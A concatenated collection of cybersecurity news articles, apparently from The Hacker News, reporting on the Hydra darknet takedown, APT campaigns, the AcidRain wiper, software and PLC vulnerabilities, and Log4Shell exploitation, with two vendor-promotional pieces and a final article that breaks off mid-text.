'text': 'The U.S. Treasury Department on Tuesday sanctioned Hydra, the same day German law enforcement authorities disrupted the world’s largest and longest-running dark web marketplace following a coordinated operation in partnership with U.S. officials.\nThe sanctions are part of an “international effort to disrupt proliferation of malicious cybercrime services, dangerous drugs, and other illegal offerings available through the Russia-based site,“ the Treasury Department said in a statement.\nAlong with the sanctions, the Office of Foreign Assets Control (OFAC) disclosed a list of more than 100 virtual currency addresses that have been identified as associated with the entity’s operations to conduct illicit transactions.\nThe sanctions come as Germany’s Federal Criminal Police Office shut down the online criminal marketplace that it said specialized in narcotics trade, seizing its servers and 543 bitcoins worth 23 million euros ($25.3 million).\n\nHydra was a Russian-language darknet platform that had been accessible via the Tor network since at least November 2015, facilitating the trafficking of outlawed goods and services, including illegal drugs, stolen financial information, fraudulent identification documents, and money laundering and mixing services.\nThe Treasury Department, in a related move, also sanctioned the virtual currency exchange Garantex, making it the third crypto platform to be blocklisted by the U.S. after SUEX and CHATEX.\n“Analysis of known Garantex transactions shows that over $100 million in transactions are associated with illicit actors and darknet markets, including nearly $6 million from Russian RaaS gang Conti and also including approximately $2.6 million from Hydra,“ the Treasury Department noted.\n\nIn a simultaneous move, the Department of Justice (DoJ) announced charges against Dmitry Olegovich Pavlov, a 30-year-old Russian national, in connection with operating the servers used to run Hydra, in addition to accusing him for furthering the distribution of narcotics and engaging in money laundering.\nPavlov is alleged to have operated a company named Promservice Ltd., also known as Hosting Company Full Drive, All Wheel Drive, and 4x4host.ru, to commandeer the servers. He also purportedly conspired with other operators of the marketplace by providing the infrastructure backbone that enabled its success in a “competitive darknet market environment.“\n“In 2021, Hydra accounted for an estimated 80% of all darknet market-related cryptocurrency transactions, and since 2015, the marketplace has received approximately $5.2 billion in cryptocurrency,“ the DoJ said.\n\nBesides allowing vendors to openly advertise a variety of deadly drugs for sale through a five-star rating system, Hydra is also said to have functioned as a distribution channel for forged passports and drivers’ licenses as well as hacking tools and services that allowed bad actors to gain illegal access to online accounts.\n\nThese transactions on Hydra were conducted in virtual currency and its administrators charged a commission for every transaction conducted on the website. Hydra also provided users with cash-out and mixing services to convert their bitcoins into different forms of digital crypto assets and conceal their tracks.\n“The dismantling of the Hydra Market, the dark web’s largest supplier of illicit goods and services, sends a message to these electronic criminal kingpins that think they can operate with impunity,“ said Special Agent in Charge Anthony Salisbury of Homeland Security Investigations (HSI) Miami.\n“HSI will continue to work with our U.S. and international law enforcement partners to target these transnational criminal organizations who attempt to manipulate the anonymity of the dark web to push their poison all over the world,“ Salisbury added.\nThe takedown has predictably “prompted heated discussions“ on the dark web, as threat actors relying on the services offered by Hydra speculate about the future of the marketplace and point out the possibility that authorities or other malicious parties could “set up fake versions of Hydra in order to track down former users.“\nHowever, the administrators of Hydra have not acknowledged the closure and are attempting to paint a different picture, cybersecurity company Flashpoint said, with the operators reportedly claiming that “the market is undergoing ’technical works.’“\n\n\nFound this article interesting?

{'title': 'Battling Cybersecurity Risk: How to Start Somewhere, Right Now',
'text': 'Between a series of recent high-profile cybersecurity incidents and the heightened geopolitical tensions, there’s rarely been a more dangerous cybersecurity environment. It’s a danger that affects every organization – automated attack campaigns don’t discriminate between targets.\nThe situation is driven in large part due to a relentless rise in vulnerabilities, with tens of thousands of brand-new vulnerabilities discovered every year. For tech teams that are probably already under-resourced, guarding against this rising tide of threats is an impossible task.\nYet, in the battle against cybercrime, some of the most effective and most sensible mitigations are sometimes neglected. In this article, we’ll outline why cybersecurity risks have escalated so dramatically – and which easy wins your organization can make for a significant difference in your cybersecurity posture, right now.\nRecent major cyberattacks point to the danger\nCyber security has arguably never been more important. With the rise in vulnerability numbers that continues unabated for years now, alongside the geopolitical tensions, no company can claim it has cybersecurity that is impervious to penetration. In recent weeks, we’ve seen non-stop reports of security breaches at Microsoft, Nvidia, Vodafone, and many others.\nThis March, a group of teenagers belonging to the Lapsus$ group managed to hack Microsoft and steal the source code for key products including its Cortana voice assistant, and an internal Azure developer server.\nLapsus$, who consists of a group of teenagers, didn’t stop there. Nvidia was also targeted, as the company admitted that sensitive corporate data was leaked, including proprietary information as well as employee credentials. Something similar happened to consumer group Samsung, and to consultancy Globant. All damage caused by just one group of miscreants.\nThe backdrop to these events\nOf course, Lapsus$ is just one active group. There are countless others going after major and minor organizations alike. The list is endless – this February mobile, fixed-line, and TV services were taken offline for a big chunk of Portugal’s population as Vodafone Portugal suffered a major cyber breach. And nobody is spared – in January 2022, the Red Cross was hacked, exposing the personal data of hundreds of thousands of people.\nHacking, intrusions, extorsions… left, right, and center. Where does it end?\nWell, it’s not likely to end anytime soon. There’s a steady stream of new vulnerabilities, and by extension, new threats appearing. By 2021, almost 22,000 new vulnerabilities were published on the National Vulnerability Database, an increase of 27% over the count for 2018, just 3 years ago. \nEvery year the total list of vulnerabilities grows, creating an ever-larger mountain of possible risks. The list of actors with interest in successfully exploiting vulnerabilities isn’t exactly shrinking either, as the latest geopolitical instability adds to the threat.\nMitigation is tough and multi-pronged\nA lot of effort goes into fixing the problem – in trying to mount a defense. But as our long list of examples proved, and as this list of major hacks underlines, these defenses don’t always work. It is too easy to under resource, and resources can easily be allocated incorrectly. \nThe problem is that fighting against cybercrime is a multi-pronged task – you can’t beat cybercriminals by focusing on one or two defensive aspects alone. It needs to be the entire remit, ranging from endpoint security and encryption, through to firewalls and advanced threat monitoring – and on to hardening exercises such as patching and restricted permissions.\nAll of these components need to be in place and performed consistently, but that’s a big ask when IT teams are struggling for staff resources. In all fairness, it’s impossible to set up a watertight cybersecurity perimeter – if multi-billion-dollar firms can’t do it, it’s unlikely that the typical business will. But some essential parts of vulnerability management are sometimes neglected.\nA quick win that’s neglected\nAccording to the Ponemon report, it takes roughly five weeks to fix a vulnerability. Therein lies a major part of the issue. Fixing vulnerabilities through patching is arguably one of the most effective ways to combat cyber threats: if the vulnerability no longer exists, the opportunity to exploit it disappears too. \nThe need to patch has been mandated at the highest level – including by the Cybersecurity and Infrastructure Security Agency (CISA), which recently published a list of vulnerabilities that must be patched by covered organizations. Similarly, CISA’s recent Shields Up notification also points strongly to patching as a critical step that significantly supports cybersecurity.\nGiven the relative ease of patching – apply it and it works – patching should be a no-brainer. Patching is an easy win that can easily transform an organization’s cybersecurity posture. A recent study by the Ponemon Institute found that of the respondents that suffered a breach, 57% said it was due to a vulnerability that could have been closed by a patch.\nWhy patching is held back\nWe’ve established that patching is effective and attainable – so the question is, what’s holding back patching? There are multiple reasons for that – including, for example, the occasional risk that an untested patch can lead to system failure. \nBut the most obvious problem is disruption during patching. Patching a system traditionally leads to it being unavailable for some amount of time. It doesn’t matter if you’re patching a critical component like the Linux Kernel or a specific service, the common approach has always been to reboot or restart after deploying patches. \nThe business implications are significant. Though you can mitigate via redundancy and careful planning, there’s still a risk of lost business, reputational damage, performance degradation, and unhappy customers and stakeholders. \nThe result is that IT teams have struggled with maintenance windows that are woefully inadequate, often too spread apart to properly react to a threat landscape that can see attacks happen within minutes of the disclosure of a vulnerability.\nActively taking steps against cyber risks\nSo yes, organizations need to patch consistently as the first step amongst many. There’s a way forward for patching, thankfully, and it’s called live patching technology. Live patching solutions like TuxCare’s KernelCare Enterprise provide a non-disruptive solution to the patching challenge. \nBy installing patches on running software on the fly, it removes the need for disruptive reboots and restarts – and maintenance windows. There is, therefore, no need to wait to install a patch. What’s more, the automated nature of live patching means that patching windows are virtually eliminated.\nIt’s essentially instantaneous patch deployment – as soon as the vendor releases a patch, that patch gets applied which reduces exposure and the risk window to the minimum, with zero impact on business activities.\nThis alternative, effective approach to patching illustrates how there are effective steps to take within the cybersecurity battle – steps that are resource-friendly too. Another simple but effective way to harden systems against cybersecurity threats is MFA. Organizations that are not yet using multi-factor authentication (MFA) should enable it wherever providers offer it.\nQuick wins are everywhere\nThe same goes for other quick wins. Take the principle of least privilege, for example. Simply by instilling a permissions-aware culture into tech teams, organizations can ensure that potential actors have minimal opportunities to enter into systems – and to progress if they do manage to enter. That goes for network segmentation, another resource-friendly but effective tool against the cybercrime threat.\nThe point is that as much as the cybersecurity threat is just about out of control, there are nonetheless many reasonably easy routes that allow organizations to mount a stronger defense. In other words, ignoring tools such as live patching, MFA, and permissions management simply makes a tough fight much harder. In contrast, jumping on these quick wins can quickly strengthen your cybersecurity posture.\n\n\nFound this article interesting?

{'title': 'Germany Shuts Down Russian Hydra Darknet Market; Seizes $25 Million in Bitcoin',
'text': 'Germany’s Federal Criminal Police Office, the Bundeskriminalamt (BKA), on Tuesday announced the official takedown of Hydra, the world’s largest illegal dark web marketplace that has cumulatively facilitated over $5 billion in Bitcoin transactions to date.\n“Bitcoins amounting to currently the equivalent of approximately €23 million were seized, which are attributed to the marketplace,“ the BKA said in a press release. Blockchain analytics firm Elliptic confirmed that the seizure occurred on April 5, 2022 in a series of 88 transactions totaling 543.3 BTC.\n\nThe agency attributed the shutdown of Hydra to an extensive investigation operation conducted by its Central Office for Combating Cybercrime (ZIT) in partnership with U.S. law enforcement authorities that it said had been underway since August 2021.\nLaunched in 2015, Hydra was a Russian-language darknet marketplace that opened as a competitor to the now-defunct Russian Anonymous Marketplace (aka RAMP), primarily known for its high-traffic narcotics market before expanding their focus to peddle forged documents and stolen credit cards.\n“Cybercriminals now use it to conduct illicit sales of stolen credit cards, SIM cards, and counterfeit documents and IDs, among other offerings — as well as to obfuscate their own digital transactions through regional exchanges and extended money laundering tactics,“ Flashpoint noted in a May 2021 report.\n\nHydra’s annual transaction volumes are estimated to have crossed $1.6 billion by the end of 2021, marking a staggering rise from a mere $6.6 million in 2016. Around 17 million customer accounts and over 19,000 seller accounts were registered on the marketplace, the BKA said.The dark web shop, which is believed to have had a turnover of $424.2 million for the first three months of 2022, also featured a Bitcoin Bank Mixer, which obfuscated all digital transactions made on the platform, thereby making it difficult for law enforcement agencies to track the cryptocurrency trails.\n\nVisitors to the marketplace website are now greeted by a seizure banner that says: “The platform and the criminal content have been seized by the Federal Criminal Police Office (BKA) on behalf of the Attorney General’s Office in Frankfurt am Main in the course of an international coordinated law enforcement operation.“\nThe demise of Hydra follows a wave of recent law enforcement actions against criminal marketplaces since the start of the year, including that of UniCC, Canadian HeadQuarters, and four Russian carding shops Ferum Shop, Sky-Fraud, Trump’s Dumps, and UAS that specialized in the sales of stolen credit cards.\n\n\nFound this article interesting?

{'title': 'Researchers Trace Widespread Espionage Attacks Back to Chinese ’Cicada’ Hackers',
'text': 'A Chinese state-backed advanced persistent threat (APT) group known for singling out Japanese entities has been attributed to a new long-running espionage campaign targeting new geographies, suggesting a “widening“ of the threat actor’s targeting.\nThe widespread intrusions, which are believed to have commenced at the earliest in mid-2021 and continued as recently as February 2022, have been tied to a group tracked as Cicada, which is also known as APT10, Stone Panda, Potassium, Bronze Riverside, or MenuPass Team.\n“Victims in this Cicada (aka APT10) campaign include government, legal, religious, and non-governmental organizations (NGOs) in multiple countries around the world, including in Europe, Asia, and North America,“ researchers from the Symantec Threat Hunter Team, part of Broadcom Software, said in a report shared with The Hacker News.\n\n“There is a strong focus on victims in the government and NGO sectors, with some of these organizations working in the areas of religion and education,“ Brigid O. Gorman, senior information developer at the Symantec Threat Hunter Team, told The Hacker News.\nMost of the targeted organizations are located in the U.S., Canada, Hong Kong, Turkey, Israel, India, Montenegro, and Italy, alongside one victim in Japan, with the adversary spending as long as nine months on the networks of some of these victims.\n“There are also some victims in the telecoms, legal and pharmaceutical sectors, but governmental and non-profit organizations appeared to have been the main focus in this campaign,“ Gorman added.\nIn March 2021, Kaspersky researchers took the wraps off an intelligence-gathering operation undertaken by the group to deploy information-gathering implants from a number of industry sectors located in Japan.\nThen earlier this February, Stone Panda was implicated in an organized supply chain attack aimed at Taiwan’s financial sector with the goal of stealing sensitive information from compromised systems.\nThe new set of attacks observed by Symantec commences with the actors gaining initial access by means of a known, unpatched vulnerability in Microsoft Exchange Servers, using it to deploy their backdoor of choice, SodaMaster.\n\n“However, we did not observe the attackers exploiting a specific vulnerability, so we cannot say if they leveraged ProxyShell or ProxyLogon [flaws],“ Gorman said.\nSodaMaster is a Windows-based remote access trojan that’s equipped with features to facilitate the retrieval of additional payloads and exfiltrate the information back to its command-and-control (C2) server.\nOther tools deployed during the infiltrations include the Mimikatz credential dumping utility, NBTScan to conduct internal reconnaissance, WMIExec for remote command execution, and VLC Media Player to launch a custom loader on the infected host.\n“This campaign with victims in such a large number of sectors appears to show the group is now interested in a wider variety of targets,“ Gorman said.\n“The sorts of organizations targeted — nonprofits and government organizations, including those involved in religious and education activity — are most likely to be of interest to the group for espionage purposes. The sort of activity we see on victim machines and past Cicada activity also all point to the motivation behind this campaign being espionage.“\n\n\nFound this article interesting?

{'title': 'Is API Security on Your Radar?',
'text': 'With the growth in digital transformation, the API management market is set to grow by more than 30%  by the year 2025 as more businesses build web APIs and consumers grow to rely on them for everything from mobile apps to customized digital services.\nAs part of strategic business planning, an API helps generate revenue by allowing customers access to the functionality of a website or computer program through custom applications.\nAs more and more businesses are implementing APIs, the risk of API attacks increases.\nBy 2022, Gartner predicted that API (Application Programming Interface) attacks would become the most common attack vector for enterprise web applications.\nCybercriminals are targeting APIs more aggressively than ever before, and businesses must take a proactive approach to API security to combat this new aggression.\nAPI and The Business World\nWith integrating APIs into modern IT environments, businesses are becoming increasingly data-driven.\nJust as a restaurant relies on an excellent chef, and a bandleader is a key to success, businesses increasingly depend on API and API integrations. Half of the online traffic is generated by users searching on companies’ publicly available APIs. All this access is expected to grow by 37% in 2022.\nAPIs can also be added to existing applications without changing the basic foundation of the software, allowing organizations to quickly develop and deploy a diverse combination of functionalities to suit specific business purposes or user groups without changing the application’s core structure.\nAPI Fuels\nCities with newer 5G wireless networks and older wireless technologies are increasingly being outfitted with high-capacity IoT endpoints - everything from fingerprint readers to smart street lamps - expanding the network’s usage opportunities.\nAccording to a projection, more than 30.9 billion IoT are expected to be in use worldwide by 2025, and the number continues to rise every year.\nNot only is the cloud-based office productivity software market expected to reach $50.7 billion by 2026, but it is also predicted to rise throughout 2022\nRise Of Growing API Attacks\nThough enterprises are taking note of the enormous potential behind APIs (and API releases), their number being launched and produced is increasing at an astronomical rate. This trend has been linked to the increasing relevance of software in today’s world.\n91% of businesses that have implemented APIs in their business systems experienced incidents related to breaches in security and cyber-attacks. Most of these businesses had to deal with a major incident within the year prior. In order to obtain full benefits of APIs, businesses need to strike accurate and fully managed API security solutions. \nSo, What 3 Key Risks API Security Poses?\nMisconfigured APIs: Right from misconfigured HTTP headers, insecure default configurations to verbose error messages, etc., the ultimate weapon of choice for hackers is the unmanaged and unsecured API vulnerability exploit, which can silently creep into the most unsuspecting places.\nMalware Attacks: Starts from taxing the web API memory to send a lot of information per request, malware attacks like DDoS (Distributed Denial of Service) attacks, SQL injection, MITM-in-the-middle attacks, or Credential stuffing to let anyone get pass-through authentication, etc. hacked, broken or exposed APIs are never-ending stories to extract data with ease.\nInadequate Assets Management: The older, less secure versions of an API leave them vulnerable to attack and data breaches. Brute-force attacks can also significantly impact an API by exhausting all login combinations and causing the server to get overloaded or even temporarily disabled.\n3 API Security Best Practices in 2022\n\n1 — Apply Zero Trust to API Security\nWith the zero-trust approach, application security teams should empower their endpoints equally to a state of threat prevention across all three, i.e., authentication, authorization, and threat prevention. This will make it more difficult for hackers to breach your online properties.\n2 — Understand And Identify API Spikes or Drops Behaviors and Interactions for Vulnerabilities \nUnderstand and further explore API logging to ensure the security and stability of your API.\nWhen trying to protect your API or its users from security issues, it’s essential to keep an eye on anything suspicious. Security issues usually appear in abnormal behavior, which doesn’t seem quite right. You can identify and address these threats before they cause harm to your API or anyone using the platform.\n3 — Delegate and Combine Authentication and Authorization\nGenerally, API developers should implement the principle of privilege separation. This general programming practice allows users to access only the specific resources and methods necessary for their role in the application.\nAPI Monitoring is a critical part of API deployment, but it’s also important to consider how you grant users access to your API. Simply verifying a user’s identity isn’t sufficient; there will likely be resources that only certain users are allowed to interact with and specific methods they must use.\nAuthentication is necessary for securely verifying the user using an API, and authorization is concerned with what data they have access to (within a request as a token).\nThe Way Forward\nYour web application or API is no different like a castle that needs a defensive moat to protect the inhabitants inside its walls. It needs protection from outside intruders and malicious agents looking to take advantage of weaknesses; that’s where Indusface WAF enters the picture.\nWith AppTrana, you get up-to-date and regular API threats review for any anomalies or suspicious usage patterns of the OWASP Top 10 Vulnerabilities and beyond.\nIf you want smooth decision-making for API vulnerability detection and protection trends, look no further than AppTrana.\n\n\nFound this article interesting?

'text': 'An Android spyware application has been spotted masquerading as a “Process Manager“ service to stealthily siphon sensitive information stored in the infected devices.\nInterestingly, the app — that has the package name “com.remote.app“ — establishes contact with a remote command-and-control server, 82.146.35[.]240, which has been previously identified as infrastructure belonging to the Russia-based hacking group known as Turla.\n\n“When the application is run, a warning appears about the permissions granted to the application,“ Lab52 researchers said. “These include screen unlock attempts, lock the screen, set the device global proxy, set screen lock password expiration, set storage encryption and disable cameras.“\nOnce the app is “activated,“ the malware removes its gear-shaped icon from the home screen and runs in the background, abusing its wide permissions to access the device’s contacts and call logs, track its location, send and read messages, access external storage, snap pictures, and record audio.\n\nThe gathered information is captured in a JSON format and subsequently transmitted to the aforementioned remote server. Despite the overlap in the C2 server used, Lab52 said it doesn’t have enough evidence to definitively attribute the malware to the Turla group.\n\nAlso unknown at this stage is the exact initial access vector employed for distributing the spyware and intended targets of the campaign.\nThat said, the rogue Android app also attempts to download a legitimate application called Roz Dhan (meaning “Daily Wealth“ in Hindi) that has over 10 million installations and allows users to earn cash rewards for completing surveys and questionnaires.\n“The application, [which] is on Google Play and is used to earn money, has a referral system that is abused by the malware,“ the researchers said. “The attacker installs it on the device and makes a profit.“\n\n\nFound this article interesting?

'text': 'At least three different advanced persistent threat (APT) groups from across the world have launched spear-phishing campaigns in mid-March 2022 using the ongoing Russo-Ukrainian war as a lure to distribute malware and steal sensitive information.\nThe campaigns, undertaken by El Machete, Lyceum, and SideWinder, have targeted a variety of sectors, including energy, financial, and governmental sectors in Nicaragua, Venezuela, Israel, Saudi Arabia, and Pakistan.\n“The attackers use decoys ranging from official-looking documents to news articles or even job postings, depending on the targets and region,“ Check Point Research said in a report. “Many of these lure documents utilize malicious macros or template injection to gain an initial foothold into the targeted organizations, and then launch malware attacks.“\n\nThe infection chains of El Machete, a Spanish-speaking threat actor first documented in August 2014 by Kaspersky, involve the use of macro-laced decoy documents to deploy an open-source remote access trojan called Loki.Rat that’s capable of harvesting keystrokes, credentials, and clipboard data as well as carrying out file operations and executing arbitrary commands.\n\nA second campaign is from the Iranian APT group known as Lyceum that Check Point said launched a phishing attack using an email purportedly about “Russian war crimes in Ukraine“ to deliver first-stage .NET and Golang droppers, which are then used to deploy a backdoor for running files retrieved from a remote server.\n\nAnother example is SideWinder, a state-sponsored hacking crew that’s said to operate in support of Indian political interests and with a specific focus on its neighbors China and Pakistan. The attack sequence, in this case, employs a weaponized document that exploits the Equation Editor flaw in Microsoft Office (CVE-2017-11882) to distribute an information stealing malware.\n\nThe findings echo similar warnings from Google’s Threat Analysis Group (TAG), which disclosed that nation-state-backed threat groups from Iran, China, North Korea, and Russia and numerous other criminal and financially motivated actors are leveraging war-related themes in phishing campaigns, online extortion attempts, and other malicious activities.\n“Although the attention of the public does not usually linger on a single issue for an extended period, the Russian-Ukrainian war is an obvious exception,“ the Israeli company said. “This war affects multiple regions around the world and has potentially far-reaching ramifications.

'text': 'A 15-year-old security vulnerability has been disclosed in the PEAR PHP repository that could permit an attacker to carry out a supply chain attack, including obtaining unauthorized access to publish rogue packages and execute arbitrary code.\n“An attacker exploiting the first one could take over any developer account and publish malicious releases, while the second bug would allow the attacker to gain persistent access to the central PEAR server,“ SonarSource vulnerability researcher Thomas Chauchefoin said in a write-up published this week.\nPEAR, short for PHP Extension and Application Repository, is a framework and distribution system for reusable PHP components.\n\nOne of the issues, introduced in a code commit made in March 2007 when the feature was originally implemented, relates to the use of the cryptographically insecure mt_rand() PHP function in the password reset functionality that could allow an attacker to “discover a valid password reset token in less than 50 tries.“\nArmed with this exploit, a bad actor could target existing developer or administrator accounts to hijack them and publish new trojanized versions of packages already maintained by the developers, resulting in a widespread supply chain compromise.\n\nThe second vulnerability, which requires the adversary to chain it with the aforementioned flaw to attain initial access, stems from pearweb’s reliance on an older version of Archive_Tar, which is susceptible to a high-severity directory traversal bug (CVE-2020-36193, CVSS score: 7.5), leading to arbitrary code execution.\n\n“These vulnerabilities have been present for more than a decade and were trivial to identify and exploit, raising questions about the lack of security contributions from companies relying on it,“ Chauchefoin said.\nThe findings mark the second time security issues have been uncovered in the PHP supply chain in less than a year. In late April 2021, critical vulnerabilities were divulged in the Composer PHP package manager that could enable an adversary to execute arbitrary commands.\nWith software supply chain attacks emerging as a dangerous threat in the wake of protestware incidents aimed at widely-used libraries in the NPM ecosystem, security issues tied to code dependencies in software are back in the spotlight, prompting the Open Source Initiative to call the “weaponization of open source“ an act of cyber vandalism that “outweigh[s] any possible benefit.“\n\n\nFound this article interesting?

{'title': 'Russian Wiper Malware Likely Behind Recent Cyberattack on Viasat KA-SAT Modems',
'text': 'The cyberattack aimed at Viasat that temporarily knocked KA-SAT modems offline on February 24, 2022, the same day Russian military forces invaded Ukraine, is believed to have been the consequence of wiper malware, according to the latest research from SentinelOne.\nThe findings come a day after the U.S. telecom company disclosed that it was the target of a multifaceted and deliberate“ cyberattack against its KA-SAT network, linking it to a “ground-based network intrusion by an attacker exploiting a misconfiguration in a VPN appliance to gain remote access to the trusted management segment of the KA-SAT network.“\nUpon gaining access, the adversary issued “destructive commands“ on tens of thousands of modems belonging to the satellite broadband service that “overwrote key data in flash memory on the modems, rendering the modems unable to access the network, but not permanently unusable.“\n\nBut SentinelOne said it uncovered a new piece of malware (named “ukrop“) on March 15 that casts the entire incident in a fresh light – a supply chain compromise of the KA-SAT management mechanism to deliver the wiper, dubbed AcidRain, to the modems and routers and achieve scalable disruption.\nAcidRain is fashioned as a 32-bit MIPS ELF executable that “performs an in-depth wipe of the filesystem and various known storage device files,“ researchers Juan Andres Guerrero-Saade and Max van Amerongen said. “If the code is running as root, AcidRain performs an initial recursive overwrite and delete of non-standard files in the filesystem.“\n\nOnce the wiping process is complete, the device is rebooted to render it inoperable. This makes AcidRain the seventh wiper strain to be uncovered since the start of the year in connection with the Russo-Ukrainian war after WhisperGate, WhisperKill, HermeticWiper, IsaacWiper, CaddyWiper, and DoubleZero.\nFurther analysis of the wiper sample has also uncovered an “interesting“ code overlap with a third stage plugin (“dstr“) used in attacks involving a malware family called VPNFilter, which has been attributed to the Russian Sandworm (aka Voodoo Bear) group.\n\nIn late February 2022, the U.K. National Cyber Security Centre (NCSC), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) revealed a successor to VPNFilter, calling the replacement framework Cyclops Blink.\nThat having said, it’s still unclear how the threat actors gained access to the VPN. In a statement shared with The Hacker News, Viasat confirmed that data destroying malware was indeed deployed on modems using “legitimate management“ commands but refrained from sharing further details citing an ongoing investigation.\nThe entire statement from the company is as follows –\nThe facts provided in the Viasat Incident Report yesterday are accurate. The analysis in the SentinelLabs report regarding the ’ukrop’ binary is consistent with the facts in our report - specifically, SentinelLabs identifies the destructive executable that was run on the modems using a legitimate management command as Viasat previously described.\nAs noted in our report: “the attacker moved laterally through this trusted management network to a specific network segment used to manage and operate the network, and then used this network access to execute legitimate, targeted management commands on a large number of residential modems simultaneously.“\nAdditionally, we don’t view this as a supply chain attack or vulnerability. As we noted, “Viasat has no evidence that standard modem software or firmware distribution or update processes involved in normal network operations were used or compromised in the attack.“ Further, “there is no evidence that any end-user data was accessed or compromised.“\nDue to the ongoing investigation and to ensure the security of our systems from ongoing attack, we cannot publicly share all forensic details of the event. Through this process, we have been, and continue to cooperate with various law enforcement and government agencies around the world, who’ve had access to details of the event.\nWe expect we can provide additional forensic details when this investigation is complete.\n\n\nFound this article interesting?

'text': 'Two new security vulnerabilities have been disclosed in Rockwell Automation’s programmable logic controllers (PLCs) and engineering workstation software that could be exploited by an attacker to inject malicious code on affected systems and stealthily modify automation processes.\nThe flaws have the potential to disrupt industrial operations and cause physical damage to factories in a manner similar to that of Stuxnet and the Rogue7 attacks, operational technology security company Claroty said.\n\n“Programmable logic and predefined variables drive these [automation] processes, and changes to either will alter normal operation of the PLC and the process it manages,“ Claroty’s Sharon Brizinov noted in a write-up published Thursday.\n\nThe list of two flaws is below –\nCVE-2022-1161 (CVSS score: 10.0) – A remotely exploitable flaw that allows a malicious actor to write user-readable “textual“ program code to a separate memory location from the executed compiled code (aka bytecode). The issue resides in PLC firmware running on Rockwell’s ControlLogix, CompactLogix, and GuardLogix control systems.CVE-2022-1159 (CVSS score: 7.7) – An attacker with administrative access to a workstation running Studio 5000 Logix Designer application can intercept the compilation process and inject code into the user program without the user’s knowledge.\nSuccessful exploitation of the defects could allow an attacker to modify user programs and download malicious code to the controller, effectively altering the PLC’s normal operation and allowing rogue commands to be sent to the physical devices controlled by the industrial system.\n\n“The end result of exploiting both vulnerabilities is the same: The engineer believes that benign code is running on the PLC; meanwhile, completely different and potentially malicious code is being executed on the PLC,“ Brizinov explained.\nThe severity of the flaws has also prompted an advisory from the U.S. Cybersecurity and Infrastructure Security Agency (CISA) that outlines mitigation steps users of the affected hardware and software can take for a “comprehensive defense-in-depth strategy.“\n\n\nFound this article interesting?

{'title': 'Chinese Hackers Target VMware Horizon Servers with Log4Shell to Deploy Rootkit',
'text': 'A Chinese advanced persistent threat tracked as Deep Panda has been observed exploiting the Log4Shell vulnerability in VMware Horizon servers to deploy a backdoor and a novel rootkit on infected machines with the goal of stealing sensitive data.\n“The nature of targeting was opportunistic insofar that multiple infections in several countries and various sectors occurred on the same dates,“ said Rotem Sde-Or and Eliran Voronovitch, researchers with Fortinet’s FortiGuard Labs, in a report released this week. “The victims belong to the financial, academic, cosmetics, and travel industries.“\nDeep Panda, also known by the monikers Shell Crew, KungFu Kittens, and Bronze Firestone, is said to have been active since at least 2010, with recent attacks “targeting legal firms for data exfiltration and technology providers for command-and-control infrastructure building,“ according to Secureworks.\n\nCybersecurity firm CrowdStrike, which assigned the panda-themed name to the threat cluster all the way back in July 2014, called it “one of the most advanced Chinese nation-state cyber intrusion groups.“\nThe latest set of attacks documented by Fortinet shows that the infection procedure involved the exploitation of the Log4j remote code execution flaw (aka Log4Shell) in vulnerable VMware Horizon servers to spawn a chain of intermediate stages, ultimately leading to the deployment of a backdoor dubbed Milestone (“1.dll“).\nBased on the leaked source code of the infamous Gh0st RAT but with notable differences in the command-and-control (C2) communication mechanism employed, Milestone is also designed to send information about the current sessions on the system to the remote server.\nAlso detected during the attacks is a kernel rootkit called “Fire Chili“ that’s digitally signed with stolen certificates from game development companies, enabling it to evade detection by security software and conceal malicious file operations, processes, registry key additions, and network connections.\n\nThis is achieved by means of ioctl (input/output control) system calls to hide the driver rootkit’s registry key, the Milestone backdoor files, and the loader file and process used to launch the implant.\nFortinet’s attribution to Deep Panda stems from overlaps between Milestone and Infoadmin RAT, a remote access trojan used by the sophisticated hacking collective in the early 2010s, with additional clues pointing to tactical similarities to that of the Winnti group.\nThis is backed by the use of compromised digital signatures belonging to gaming companies, a target of choice for Winnti, as well as a C2 domain (gnisoft[.]com), which has been previously linked to the Chinese state-sponsored actor as of May 2020.\n“The reason these tools are linked to two different groups is unclear at this time,“ the researchers said. “It’s possible that the groups’ developers shared resources, such as stolen certificates and C2 infrastructure, with each other. This may explain why the samples were only signed several hours after being compiled.“\n\nThe disclosure adds to a long list of hacking groups that have weaponized the Log4Shell vulnerability to strike VMware’s virtualization platform.\nIn December 2021, CrowdStrike described an unsuccessful campaign undertaken by an adversary dubbed Aquatic Panda that leveraged the flaw to perform various post-exploitation operations, including reconnaissance and credential harvesting on targeted systems.\nSince then, multiple groups have joined the fray, including the Iranian TunnelVision group, which was observed actively exploiting the Log4j logging library defect to compromise unpatched VMware Horizon servers with ransomware.\nMost recently, cybersecurity company Sophos highlighted a slew of attacks against vulnerable Horizon servers that have been ongoing since January and have been mounted by threat actors to illicitly mine cryptocurrency, install PowerShell-based reverse shells, or to deploy Atera agents to remotely deliver additional payloads.\n“Attempts to compromise Horizon servers are among the more targeted exploits of Log4Shell vulnerabilities because of their nature,“ Sophos researchers said, adding “platforms such as Horizon are particularly attractive targets to all types of malicious actors because they are widespread and can (if still vulnerable) easily found and exploited with well-tested tools.“\n\n\nFound this article interesting?

{'title': 'Results Overview: 2022 MITRE ATT&CK Evaluation – Wizard Spider and Sandworm Edition',
'text': 'Threat actor groups like Wizard Spider and Sandworm have been wreaking havoc over the past few years – developing and deploying cybercrime tools like Conti, Trickbot, and Ryuk ransomware. Most recently, Sandworm (suspected to be a Russian cyber-military unit) unleashed cyberattacks against Ukranian infrastructure targets.\nTo ensure cybersecurity providers are battle ready, MITRE Engenuity uses real-world attack scenarios and tactics implemented by threat groups to test security vendors’ capabilities to protect against threats – the MITRE ATT&CK Evaluation. Each vendor’s detections and capabilities are assessed within the context of the MITRE ATT&CK Framework.\nThis year, they used the tactics seen in Wizard Spider and Sandworm’s during their evaluation simulations. And MITRE Engenuity didn’t go easy on these participating vendors. As mentioned before – the stakes are too high, and risk is growing.\nThe 2022 results overview\nTo think about it simply, this MITRE ATT&CK Evaluation measured protection capabilities of 30 endpoint protection solutions. Two key measurements that are generated from the testing are Overall Detection and Overall Protection.\nAs one participating vendor, Cynet, explained in a blog post reviewing the results, “Overall Detection (What MITRE refer to as “Visibility“) is the total number of attack steps detected across all 109 sub-steps. Overall Prevention (What MITRE refer to as “Protection“) measures how early in the attack sequence the threat was detected so that subsequent steps could not execute. Both are important measurements and are indicative of a strong endpoint detection solution.“\nHow it works \nMITRE ATT&CK uses a unique approach, testing 30 security vendors this year for their ability to protect against attacks that are currently happening in the wild. They do it by putting these vendors through a 